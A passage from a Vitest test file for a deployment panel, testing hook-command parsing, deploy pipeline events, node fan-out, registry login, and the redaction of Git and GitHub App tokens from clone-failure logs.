  it('drops NULL-workspace (operator-only) projects for non-operators', async () => {
    const db = spyDb();
    db.query.projects.findFirst.mockResolvedValue({ id: 4, workspaceId: null });
    db.query.workspaceMembers.findFirst.mockResolvedValue({ workspaceId: 1, role: 'owner' });
    const kept = await filterTrustworthyProjectLinks(db as never, owner, [{ projectId: 4 }]);
    expect(kept).toEqual([]);
  });

  it('passes every link through for an instance-operator owner', async () => {
    const db = spyDb();
    db.query.users.findFirst.mockResolvedValue({ id: 7, isInstanceOperator: true });
    const kept = await filterTrustworthyProjectLinks(db as never, owner, links);
    expect(kept).toEqual(links);
    // The operator decision short-circuits before any per-project lookup.
    expect(db.query.projects.findFirst).not.toHaveBeenCalled();
  });

  it('drops every link when the service has no owner at all', async () => {
    const db = spyDb();
    const kept = await filterTrustworthyProjectLinks(db as never, { ownerUserId: null }, links);
    expect(kept).toEqual([]);
  });
});

describe('splitHookCommand', () => {
  it('splits plain argv on whitespace', () => {
    expect(splitHookCommand('npm run build')).toEqual(['npm', 'run', 'build']);
    expect(splitHookCommand('  spaced   out  ')).toEqual(['spaced', 'out']);
  });

  it('honours double-quoted segments', () => {
    expect(splitHookCommand('node -e "let x = 1"')).toEqual(['node', '-e', 'let x = 1']);
    expect(splitHookCommand('sh -c "a && b"')).toEqual(['sh', '-c', 'a && b']);
  });

  it('honours single-quoted segments (fully literal)', () => {
    expect(splitHookCommand(`node -e 'let y = 2'`)).toEqual(['node', '-e', 'let y = 2']);
    expect(splitHookCommand(`echo 'a "b" c'`)).toEqual(['echo', 'a "b" c']);
  });

  it('handles backslash escapes', () => {
    expect(splitHookCommand(String.raw`echo a\ b`)).toEqual(['echo', 'a b']);
    expect(splitHookCommand(String.raw`echo "say \"hi\""`)).toEqual(['echo', 'say "hi"']);
    expect(splitHookCommand(String.raw`echo "c:\\tmp"`)).toEqual(['echo', 'c:\\tmp']);
  });

  it('keeps quoted empty strings as empty argv entries', () => {
    expect(splitHookCommand('touch ""')).toEqual(['touch', '']);
    expect(splitHookCommand(`a '' b`)).toEqual(['a', '', 'b']);
  });

  it('treats an unterminated quote as running to end of input', () => {
    expect(splitHookCommand('node -e "let x = 1')).toEqual(['node', '-e', 'let x = 1']);
  });

  it('returns empty argv for blank input', () => {
    expect(splitHookCommand('')).toEqual([]);
    expect(splitHookCommand('   ')).toEqual([]);
  });
});

describe('r237: kernel deploy hooks', () => {
  it('calls deploy:before and deploy:after around a deployment', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    const hooks = { call: vi.fn(async (_n: string, p: unknown) => p), hasListeners: vi.fn(() => true) };
    await runDeployment(db as never, 1, { useBuildKit: false, hooks: hooks as never });
    const names = hooks.call.mock.calls.map((c) => c[0]);
    expect(names[0]).toBe('deploy:before');
    expect(names).toContain('deploy:after');
    const after = hooks.call.mock.calls.find((c) => c[0] === 'deploy:after')![1] as { deployId: number };
    expect(after.deployId).toBe(1);
  });

  it('fires deploy:after with success=false when the deploy fails', async () => {
    const { db } = makeDb();
    baseSetup(db, { type: 'k8s' });
    db.query.deployments.findFirst.mockResolvedValueOnce(dep).mockResolvedValue({ ...dep, status: 'failed' });
    const hooks = { call: vi.fn(async (_n: string, p: unknown) => p), hasListeners: vi.fn(() => true) };
    await runDeployment(db as never, 1, { useBuildKit: false, hooks: hooks as never });
    const after = hooks.call.mock.calls.find((c) => c[0] === 'deploy:after')![1] as { success: boolean };
    expect(after.success).toBe(false);
  });

  it('a throwing hook bus never fails the deployment', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    const hooks = { call: vi.fn(async () => { throw new Error('bus down'); }), hasListeners: vi.fn(() => true) };
    await expect(runDeployment(db as never, 1, { useBuildKit: false, hooks: hooks as never })).resolves.toBeUndefined();
    expect(h.builder.buildAndRun).toHaveBeenCalled();
  });
});


describe('r239: kernel service lifecycle events', () => {
  it('emits service.deploying and service.deployed with the linked projects', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    db.query.deployments.findFirst.mockResolvedValue({ ...dep, status: 'running' });
    db.query.serviceProjects.findMany.mockResolvedValue([{ serviceId: 1, projectId: 9 }, { serviceId: 1, projectId: 4 }]);
    const emit = vi.fn();
    await runDeployment(db as never, 1, { useBuildKit: false, events: { emit } as never });
    const names = emit.mock.calls.map((c) => c[0]);
    expect(names).toEqual(['service.deploying', 'service.deployed']);
    expect(emit.mock.calls[1]![1]).toMatchObject({ status: 'success', projectId: 4, projectIds: [4, 9], deployId: 1 });
  });

  it('does not announce a cancelled deployment as an outcome', async () => {
    const { db } = makeDb();
    baseSetup(db, { type: 'k8s' });
    db.query.deployments.findFirst.mockResolvedValueOnce(dep).mockResolvedValueOnce(dep).mockResolvedValue({ ...dep, status: 'cancelled' });
    const emit = vi.fn();
    await runDeployment(db as never, 1, { useBuildKit: false, events: { emit } as never });
    expect(emit.mock.calls.map((c) => c[0])).toEqual(['service.deploying']);
  });
});

describe('r353: source fan-out and Git credentials', () => {
  let egressEnv: string | undefined;
  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async () => true);
    h.builder.stop.mockImplementation(async () => undefined);
    h.checkoutCommit.mockImplementation(async () => 'sha-1234567');
    h.writeDynamicConfig.mockImplementation(async () => undefined);
    // The node answers every op; the new container is reported running.
    h.agentOp.mockImplementation(async (...args: unknown[]) =>
      args[2] === 'docker.inspect'
        ? { exitCode: 0, lines: ['running|none|0|0'] }
        : args[2] === 'agent.ping'
          ? { exitCode: 0, lines: ['ND-AGENT {"version":"0.10.42","caps":["build-path-guard","workspace.remove"]}'] }
          : { exitCode: 0, lines: [] },
    );
    // No DNS in unit tests: the clone egress gate is bypassed for the control
    // case (the refusal itself is covered in fanout.test.ts).
    egressEnv = process.env['NINEDEPLOY_ALLOW_PRIVATE_EGRESS'];
    process.env['NINEDEPLOY_ALLOW_PRIVATE_EGRESS'] = '1';
  });
  afterEach(() => {
    logBus.removeAllListeners();
    if (egressEnv === undefined) delete process.env['NINEDEPLOY_ALLOW_PRIVATE_EGRESS'];
    else process.env['NINEDEPLOY_ALLOW_PRIVATE_EGRESS'] = egressEnv;
  });

  /** A panel-hosted source service with one extra fan-out node (#9). */
  const withTarget = (db: FakeDb) => {
    db.select.mockImplementation(() => ({
      from: vi.fn((table: unknown) => {
        const rows = table === serviceTargets ? [{ serverId: 9, runtimeId: null }] : [];
        return {
          where: vi.fn(() => Object.assign(Promise.resolve(rows), { limit: vi.fn(() => Promise.resolve(rows)) })),
          leftJoin: vi.fn(() => Promise.resolve([])),
          innerJoin: vi.fn(() => Promise.resolve([])),
          orderBy: vi.fn(() => Promise.resolve([])),
          // biome-ignore lint/suspicious/noThenProperty: intentional thenable — the fake DB query result must be awaitable by the code under test.
          then: (ok: (v: unknown) => unknown) => ok(rows),
        };
      }),
    }));
  };
  const nodeOps = () => h.agentOp.mock.calls.map((c) => c[2]);

  it('skips source fan-out with a log line when the repository is cloned with a Git credential', async () => {
    const { db } = makeDb();
    baseSetup(db, { sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'github', tokenEncrypted: 'tok', deployKeyEncrypted: null });
    withTarget(db);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✓ Deployment successful');
    expect(lines.some((l) => l.startsWith('Fan-out skipped: this repository is cloned with a Git credential'))).toBe(true);
    // No node was asked to clone the private repository anonymously.
    expect(nodeOps()).not.toContain('git.ensure');
  });

  it('still fans a public source release out to the extra node (control)', async () => {
    const { db } = makeDb();
    baseSetup(db, { sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'custom', tokenEncrypted: null, deployKeyEncrypted: null });
    withTarget(db);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines.some((l) => l.startsWith('Fan-out skipped'))).toBe(false);
    expect(nodeOps()).toContain('git.ensure');
    expect(nodeOps()).toContain('docker.build');
  });

  // r592: the fan-out resolved its registry credential from the service IMAGE,
  // so a repository-built service never had one and every node pulled the
  // Dockerfile's private base image anonymously.
  it("r592: logs each node in to the registry credential's single bound host before a source build", async () => {
    const { db } = makeDb();
    baseSetup(db, { sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', name: 'ghcr-ci', registryUsername: 'ci', tokenEncrypted: 'tok-enc' });
    db.query.settings.findFirst.mockResolvedValue({ key: 'registry_source_hosts', value: { '7': ['ghcr.io'] } });
    withTarget(db);

    await runDeployment(db as never, 1);

    const login = h.agentOp.mock.calls.find((c) => c[2] === 'docker.login');
    expect(login?.[1]).toBe(9);
    expect(login?.[3]).toEqual({ username: 'ci', password: 'dec:tok-enc', server: 'ghcr.io' });
    const ops = nodeOps();
    expect(ops.indexOf('docker.login')).toBeLessThan(ops.indexOf('docker.build'));
    // The panel-hosted primary is unchanged: no credential for a repo build.
    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();
  });

  it('r592: sends nothing when the credential is bound to several hosts (or none) — and says why', async () => {
    const { db } = makeDb();
    baseSetup(db, { sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', name: 'ghcr-ci', registryUsername: 'ci', tokenEncrypted: 'tok-enc' });
    withTarget(db);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(nodeOps()).not.toContain('docker.login');
    expect(nodeOps()).toContain('docker.build');
    expect(lines.some((l) => l.includes('registry credential "ghcr-ci" is bound to') && l.includes('source build names no registry'))).toBe(true);
  });
});

describe('r520: railpack on an install that cannot run it', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async () => true);
    h.checkoutCommit.mockImplementation(async () => 'sha-1234567');
    h.writeDynamicConfig.mockImplementation(async () => undefined);
  });

  it('fails before the checkout with the reason, keeping the previous runtime', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' });
    db.query.buildConfigs.findFirst.mockResolvedValue({ buildPack: 'railpack', baseDir: '/' });
    h.railpackUnavailableReason.mockResolvedValueOnce('The railpack build pack is not available on this installation');
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).not.toHaveBeenCalled();
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    expect(lines.join(' ')).toMatch(/railpack build pack is not available/);
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
  });

  it('builds as usual when the CLI is there (and never probes for other packs)', async () => {
    const { db } = makeDb();
    baseSetup(db);
    db.query.buildConfigs.findFirst.mockResolvedValue({ buildPack: 'railpack', baseDir: '/' });
    await runDeployment(db as never, 1);
    expect(h.builder.buildAndRun).toHaveBeenCalled();

    h.railpackUnavailableReason.mockClear();
    const other = makeDb();
    baseSetup(other.db);
    await runDeployment(other.db as never, 1);
    expect(h.railpackUnavailableReason).not.toHaveBeenCalled();
  });
});

describe('F860: a template service with a second attached database', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async () => true);
    h.writeDynamicConfig.mockImplementation(async () => undefined);
    h.connectionString.mockImplementation(((d: { engine: string; internalHost: string }) => `${d.engine}://${d.internalHost}`) as never);
  });

  afterEach(() => {
    h.connectionString.mockImplementation(() => 'postgres://db/app');
    delete (h.ENGINES as Record<string, unknown>).redis;
  });

  const mysqlWp = { id: 10, engine: 'mysql', status: 'running', internalHost: 'nd-db-wp', internalPort: 3306, passwordEncrypted: 'wp-secret', dbName: 'app' };
  const redisCache = { id: 11, engine: 'redis', status: 'running', internalHost: 'nd-db-cache', internalPort: 6379, passwordEncrypted: 'redis-secret', dbName: null };

  it.each([
    ['template database attached first', [10, 11]],
    ['cache attached first', [11, 10]],
  ])('maps the contract onto the template database only, and the cache keeps REDIS_URL (%s)', async (_label, order) => {
    (h.ENGINES as Record<string, unknown>).redis = { port: 6379, username: () => undefined, dbName: () => undefined };
    const { db } = makeDb();
    baseSetup(db, {
      image: 'wordpress:6',
      port: 80,
      templateId: 'wordpress',
      templateDatabaseEnv: { WORDPRESS_DB_HOST: 'hostPort', WORDPRESS_DB_PASSWORD: 'password' },
    });
    // The reconcile hands back the template's own database row.
    h.reconcileTemplateDependencies.mockResolvedValueOnce({ database: { ...mysqlWp, slug: 'wp-db' }, alreadyAttached: true } as never);
    const byId: Record<number, unknown> = { 10: mysqlWp, 11: redisCache };
    const alias: Record<number, string> = { 10: 'DATABASE_URL', 11: 'REDIS_URL' };
    db.query.databaseAttachments.findMany.mockResolvedValue(order.map((id, i) => ({ id: i + 1, serviceId: 5, databaseId: id, envAlias: alias[id] })));
    let n = 0;
    db.query.databases.findFirst.mockImplementation(async () => byId[order[n++ % order.length]!]);

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls.at(-1) as [{ env: Record<string, string> }];
    // Before the fix the redis attachment (last) won: WORDPRESS_DB_HOST=nd-db-cache:6379, REDIS_URL unset.
    expect(ctx.env).toMatchObject({
      WORDPRESS_DB_HOST: 'nd-db-wp:3306',
      WORDPRESS_DB_PASSWORD: 'dec:wp-secret',
      REDIS_URL: 'redis://nd-db-cache',
    });
    expect(ctx.env).not.toHaveProperty('DATABASE_URL');
  });
});

describe('F861: an error the pipeline does not handle itself settles the row', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async () => true);
    h.writeDynamicConfig.mockImplementation(async () => undefined);
  });

  it('marks the deployment failed when the "deploying" write throws, and still rejects', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    const plainUpdate = db.update.getMockImplementation()!;
    let thrown = false;
    db.update.mockImplementation((table: unknown) => {
      const builder = plainUpdate(table) as { set: (values: Record<string, unknown>) => unknown };
      return {
        set: (values: Record<string, unknown>) => {
          if (!thrown && table === services && values.status === 'deploying') {
            thrown = true;
            throw new Error('SQLITE_BUSY: database is locked');
          }
          return builder.set(values);
        },
      };
    });
    const lines = collectLogs(1);

    await expect(runDeployment(db as never, 1)).rejects.toThrow('SQLITE_BUSY');

    // Before the fix the last deployment write was the claim (`building`): the
    // row stayed `building`, blocking the service's queue until the 45-min sweep.
    const depWrites = updates.filter((u) => u.table === deployments).map((u) => u.values.status);
    expect(depWrites.at(-1)).toBe('failed');
    expect(lines).toContain('✗ Deployment failed: SQLITE_BUSY: database is locked');
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
  });
});

describe('F881: the run signals end-of-log only after its final settle', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async () => true);
    h.writeDynamicConfig.mockImplementation(async () => undefined);
  });

  it('a proxy swap that fails after the row was finalized `running` still writes its lines before the end signal', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c', port: 8080, commitSha: 'oldsha1' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    const duringSwap: { finalized: boolean; writing: boolean }[] = [];
    h.writeDynamicConfig.mockImplementation(async () => {
      duringSwap.push({
        finalized: updates.some((u) => u.table === deployments && u.values.status === 'running'),
        writing: logBus.isWriting(1),
      });
      throw new Error('ENOSPC: no space left on device');
    });
    const seen: string[] = [];
    logBus.subscribe(
      1,
      (line) => seen.push(line),
      () => seen.push('<END>'),
    );

    await runDeployment(db as never, 1);

    // The row was already `running` while the swap ran — and the log was still being written.
    expect(duringSwap).toEqual([
      { finalized: true, writing: true },
      { finalized: true, writing: true },
    ]);
    expect(seen.filter((l) => l === '<END>')).toHaveLength(1);
    expect(seen.at(-1)).toBe('<END>');
    const revert = seen.findIndex((l) => l.includes('Reverting to the previous runtime'));
    expect(revert).toBeGreaterThan(-1);
    expect(revert).toBeLessThan(seen.indexOf('<END>'));
    expect(logBus.isWriting(1)).toBe(false);
  });

  it("F861's failUnsettledDeployment line precedes the end signal", async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    db.query.buildConfigs.findFirst.mockRejectedValue(new Error('SQLITE_BUSY: database is locked'));
    const seen: string[] = [];
    logBus.subscribe(
      1,
      (line) => seen.push(line),
      () => seen.push('<END>'),
    );

    await expect(runDeployment(db as never, 1)).rejects.toThrow('SQLITE_BUSY');

    expect(seen).toEqual(['✗ Deployment failed: SQLITE_BUSY: database is locked', '<END>']);
    expect(logBus.isWriting(1)).toBe(false);
  });
});

describe('F1012/F1013: a failed clone names its reason and never repeats the credential', () => {
  const OWNER = 42;
  // decrypt() is mocked as `dec:<value>`; the checkout injects it URL-encoded.
  const TOKEN = 'dec:ghp_F1013SECRET/x+y';
  const userinfo = `x-access-token:${encodeURIComponent(TOKEN)}@`;
  const githubSource = { id: 7, type: 'github', tokenEncrypted: 'ghp_F1013SECRET/x+y', deployKeyEncrypted: null };

  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async () => true);
    h.writeDynamicConfig.mockImplementation(async () => undefined);
  });

  afterEach(() => {
    logBus.removeAllListeners();
    h.checkoutCommit.mockImplementation(async () => 'sha-1234567');
  });

  function failedReason(inserts: { table: unknown; values: Record<string, unknown> }[]): string | undefined {
    const row = inserts.find((i) => i.table === auditLog && i.values.action === 'deploy.failed');
    return (row?.values.meta as { reason?: string } | undefined)?.reason;
  }

  it('names the reason class with the token advice in the deploy log and the deploy.failed reason', async () => {
    const { db, updates, inserts } = makeDb();
    baseSetup(db, { ownerUserId: OWNER, sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue(githubSource);
    h.checkoutCommit.mockRejectedValue(
      new Error("Cloning into '/srv/repos/5'...\nremote: Repository not found.\nfatal: repository 'https://github.com/a/b.git/' not found\n"),
    );
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const want = 'Clone failed (reason: repository not found or no access): the repository was not found or the selected credential has no access to it.';
    expect(lines.some((l) => l.startsWith(`✗ ${want} For a fine-grained GitHub token`))).toBe(true);
    expect(lines.some((l) => l.startsWith(`✗ Deployment failed: ${want}`))).toBe(true);
    expect(failedReason(inserts)?.startsWith(want)).toBe(true);
    // Built from constants — none of git's text, nor the panel's repos path.
    expect(failedReason(inserts)).not.toContain('/srv/repos');
    // Unchanged flow: the row is failed and the per-setup hint is still logged.
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
    expect(lines.some((l) => l.startsWith('hint: cloning used the source'))).toBe(true);
  });

  it('keeps the access token out of the log, the log file and the deploy.failed reason when a submodule clone fails', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: OWNER, sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue(githubSource);
    // git 2.55's submodule helper prints the submodule URL resolved against the
    // tokenized origin (captured offline, see the F1013 ledger entry).
    h.checkoutCommit.mockRejectedValue(
      new Error(
        "Cloning into '/srv/repos/5/lib/shared'...\nremote: Repository not found.\nfatal: repository 'https://github.com/a/shared.git/' not found\n" +
          `fatal: clone of 'https://${userinfo}github.com/a/shared.git' into submodule path '/srv/repos/5/lib/shared' failed\n`,
      ),
    );
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const onDisk = readFileSync(path.join(logsDir, '1.log'), 'utf8');
    for (const text of [lines.join('\n'), onDisk, failedReason(inserts) ?? '']) {
      expect(text).not.toContain('F1013SECRET');
      expect(text).not.toContain('x-access-token:');
    }
    expect(failedReason(inserts)).toContain('The failing clone was a submodule of this repository');
    expect(lines.some((l) => l.startsWith('git output (credentials removed): ') && l.includes("clone of 'https://***@github.com/a/shared.git'"))).toBe(true);
  });

  it('redacts an unrecognised clone error but leaves a clean one untouched', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: OWNER, sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue(githubSource);
    h.checkoutCommit.mockRejectedValueOnce(new Error(`fatal: clone of 'https://${userinfo}github.com/a/shared.git' into submodule path 'lib/shared' failed`));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain("✗ Clone failed: fatal: clone of 'https://***@github.com/a/shared.git' into submodule path 'lib/shared' failed");
    expect(failedReason(inserts)).toBe("fatal: clone of 'https://***@github.com/a/shared.git' into submodule path 'lib/shared' failed");

    const second = makeDb();
    baseSetup(second.db, { ownerUserId: OWNER });
    h.checkoutCommit.mockRejectedValueOnce(new Error('auth failed'));
    await runDeployment(second.db as never, 1);
    expect(failedReason(second.inserts)).toBe('auth failed');
  });
});

describe('0.13: a GitHub App clone', () => {
  const OWNER = 42;
  const APP_TOKEN = 'ghs_PIPELINESECRET0123';
  const userinfo = `x-access-token:${APP_TOKEN}@`;

  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async () => true);
    h.writeDynamicConfig.mockImplementation(async () => undefined);
  });

  afterEach(() => {
    logBus.removeAllListeners();
    h.checkoutCommit.mockImplementation(async () => 'sha-1234567');
    h.installationToken.mockImplementation(async () => {
      throw new Error('installationToken was not expected in this test');
    });
  });

  function failedReason(inserts: { table: unknown; values: Record<string, unknown> }[]): string | undefined {
    const row = inserts.find((i) => i.table === auditLog && i.values.action === 'deploy.failed');
    return (row?.values.meta as { reason?: string } | undefined)?.reason;
  }

  /** Service #5 linked to installation row #3 of App #2 (github.com), repository id 31337. */
  function linkedDb() {
    const made = makeDb();
    baseSetup(made.db, { ownerUserId: OWNER });
    made.db.query.serviceGithubLinks.findFirst.mockResolvedValue({
      id: 1,
      serviceId: 5,
      installationRowId: 3,
      repoId: 31337,
      repoFullName: 'a/b',
      enabled: true,
      tokenScope: 'repository',
    });
    made.db.query.githubAppInstallations.findFirst.mockResolvedValue({
      id: 3,
      githubAppId: 2,
      installationId: 9001,
      accountLogin: 'a',
      suspendedAt: null,
      removedAt: null,
    });
    made.db.query.githubApps.findFirst.mockResolvedValue({ id: 2, webBaseUrl: 'https://github.com', apiBaseUrl: 'https://api.github.com' });
    return made;
  }

  it('clones with a repo-scoped token, prints the App hint, and never repeats the token', async () => {
    const { db, inserts } = linkedDb();
    h.installationToken.mockResolvedValue(APP_TOKEN);
    h.checkoutCommit.mockRejectedValue(
      new Error(
        "Cloning into '/srv/repos/5/lib/shared'...\nremote: Repository not found.\nfatal: repository 'https://github.com/a/shared.git/' not found\n" +
          `fatal: clone of 'https://${userinfo}github.com/a/shared.git' into submodule path '/srv/repos/5/lib/shared' failed\n`,
      ),
    );
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.installationToken.mock.calls[0]![3]).toEqual({ repositoryIds: [31337], permissions: { contents: 'read' } });
    expect(h.checkoutCommit.mock.calls[0]![5]).toStrictEqual({ type: 'github_app', token: APP_TOKEN });
    expect(lines).toContain(githubAppCloneHint());
    expect(githubAppCloneHint()).toMatch(/selected repositories/);
    expect(githubAppCloneHint()).toMatch(/suspended nor uninstalled/);
    expect(githubAppCloneHint()).toMatch(/token scope to "installation"/);
    // The App advice replaces the fine-grained PAT advice.
    expect(failedReason(inserts)).toContain("add this repository to the installation's repository access");
    expect(failedReason(inserts)).not.toContain('fine-grained');
    expect(lines.some((l) => l.startsWith('hint: cloning used the source'))).toBe(false);
    const onDisk = readFileSync(path.join(logsDir, '1.log'), 'utf8');
    for (const text of [lines.join('\n'), onDisk, failedReason(inserts) ?? '']) {
      expect(text).not.toContain(APP_TOKEN);
      expect(text).not.toContain('x-access-token:');
    }
  });

  it('a token that cannot be minted fails the deploy before the checkout, with the hint', async () => {
    const { db, inserts } = linkedDb();
    const why =
      "The GitHub App installation on a (installation 9001) cannot access the requested repository: it is not among the installation's selected repositories, or it was deleted.";
    h.installationToken.mockRejectedValue(new GithubAppError(why, 'not_accessible', 422));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).not.toHaveBeenCalled();
    expect(lines).toContain(githubAppCloneHint());
    expect(failedReason(inserts)).toBe(why);
  });

  it('refuses a repository URL on another host without minting a token', async () => {
    const { db, inserts } = linkedDb();
    db.query.services.findFirst.mockResolvedValue({ ...service, ownerUserId: OWNER, repoUrl: 'https://gitlab.com/a/b.git' });

    await runDeployment(db as never, 1);

    expect(h.installationToken).not.toHaveBeenCalled();
    expect(h.checkoutCommit).not.toHaveBeenCalled();
    expect(failedReason(inserts)).toBe('Refusing to send a GitHub App token to gitlab.com: the App belongs to github.com');
  });
});

describe('0.13 (T5): GitHub App repositories on nodes — pipeline wiring', () => {
  const PANEL_TOKEN = 'ghs_PANELCLONE0123';
  const NODE_TOKEN = 'ghs_NODEJOB4567';
  const CAPS = 'ND-AGENT {"version":"0.13.0","caps":["build-path-guard","workspace.remove","git.credential"]}';
  let egressEnv: string | undefined;

  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async () => true);
    h.checkoutCommit.mockImplementation(async () => 'sha-1234567');
    h.writeDynamicConfig.mockImplementation(async () => undefined);
    h.agentTransportSealed.mockResolvedValue(true);
    // A fresh (per-job) mint is the node's token; the cached one is the panel's.
    h.installationToken.mockImplementation(async (...args: unknown[]) =>
      (args[3] as { fresh?: boolean } | undefined)?.fresh ? NODE_TOKEN : PANEL_TOKEN,
    );
    h.agentOp.mockImplementation(async (...args: unknown[]) =>
      args[2] === 'docker.inspect'
        ? { exitCode: 0, lines: ['running|none|0|0'] }
        : args[2] === 'agent.ping'
          ? { exitCode: 0, lines: [CAPS] }
          : args[2] === 'file.writeEnv'
            ? { exitCode: 0, lines: ['wrote .agent-env/x.env'] }
            : { exitCode: 0, lines: [] },
    );
    egressEnv = process.env['NINEDEPLOY_ALLOW_PRIVATE_EGRESS'];
    process.env['NINEDEPLOY_ALLOW_PRIVATE_EGRESS'] = '1';
  });
  afterEach(() => {
    logBus.removeAllListeners();
    if (egressEnv === undefined) delete process.env['NINEDEPLOY_ALLOW_PRIVATE_EGRESS'];
    else process.env['NINEDEPLOY_ALLOW_PRIVATE_EGRESS'] = egressEnv;
    h.installationToken.mockImplementation(async () => {
      throw new Error('installationToken was not expected in this test');
    });
  });

  /** Service #5 linked to installation row #3 of App #2 (github.com), repository id 31337. */
  function linkedDb(over: Record<string, unknown> = {}) {
    const made = makeDb();
    baseSetup(made.db, { ownerUserId: 42, ...over });
    made.db.query.serviceGithubLinks.findFirst.mockResolvedValue({
      id: 1,
      serviceId: 5,
      installationRowId: 3,
      repoId: 31337,
      repoFullName: 'a/b',
      enabled: true,
      tokenScope: 'repository',
    });
    made.db.query.githubAppInstallations.findFirst.mockResolvedValue({
      id: 3,
      githubAppId: 2,
      installationId: 9001,
      accountLogin: 'a',
      suspendedAt: null,
      removedAt: null,
    });
    made.db.query.githubApps.findFirst.mockResolvedValue({ id: 2, webBaseUrl: 'https://github.com', apiBaseUrl: 'https://api.github.com' });
    return made;
  }
  const gitCalls = () =>
    h.agentOp.mock.calls
      .filter((c) => String(c[2]).startsWith('git.'))
      .map((c) => ({
        server: c[1] as number,
        op: c[2] as string,
        credential: (c[3] as { credential?: { password: string } }).credential?.password,
      }));
  const freshMints = () => h.installationToken.mock.calls.filter((c) => (c[3] as { fresh?: boolean } | undefined)?.fresh);

  it('a node-pinned App service is checked out with a fresh per-job token, revoked after the checkout', async () => {
    const { db } = linkedDb({ serverId: 4 });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(gitCalls().filter((c) => c.server === 4).map((c) => [c.op, c.credential])).toEqual([
      ['git.ensure', NODE_TOKEN],
      ['git.fetch', NODE_TOKEN],
      ['git.checkout', undefined],
      ['git.reset', NODE_TOKEN],
    ]);
    expect(freshMints().map((c) => c[3])).toEqual([{ repositoryIds: [31337], permissions: { contents: 'read' }, fresh: true }]);
    expect(h.revokeInstallationToken).toHaveBeenCalledTimes(1);
    expect(h.revokeInstallationToken.mock.calls[0]![1]).toBe(NODE_TOKEN);
    expect(lines.join('\n')).not.toContain(NODE_TOKEN);
    expect(lines.some((l) => /clones anonymously/.test(l))).toBe(false);
  });

  it('an older node agent refuses the deploy with the update message and nothing is minted for it', async () => {
    const { db } = linkedDb({ serverId: 4 });
    h.agentOp.mockImplementation(async (...args: unknown[]) =>
      args[2] === 'agent.ping'
        ? { exitCode: 0, lines: ['ND-AGENT {"version":"0.12.0","caps":["build-path-guard","workspace.remove"]}'] }
        : { exitCode: 0, lines: [] },
    );
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines.join(' ')).toMatch(/update the node agent to use GitHub App repositories on this node/i);
    expect(gitCalls()).toHaveLength(0);
    expect(freshMints()).toHaveLength(0);
  });

  it('an App source build fans out to an extra node with its own per-job token', async () => {
